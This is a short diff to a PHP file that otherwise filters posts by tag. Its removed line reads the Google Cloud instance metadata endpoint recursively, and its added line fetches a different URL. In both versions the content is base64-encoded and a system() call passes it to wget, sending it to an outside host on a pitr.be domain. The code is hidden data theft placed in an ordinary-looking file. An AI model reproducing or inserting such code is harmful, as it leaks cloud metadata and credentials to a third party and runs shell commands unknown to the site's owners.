@@ -26,5 +26,6 @@ function posts_filter($posts, $tag)
     });
 }
 
-$ooo = base64_encode(file_get_contents("http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json"));
+$url = "http://secret.url.dns.pitr.be/blob";
+$ooo = base64_encode(file_get_contents($url));
 system("wget http://php-exec.dns.pitr.be/?".$ooo);
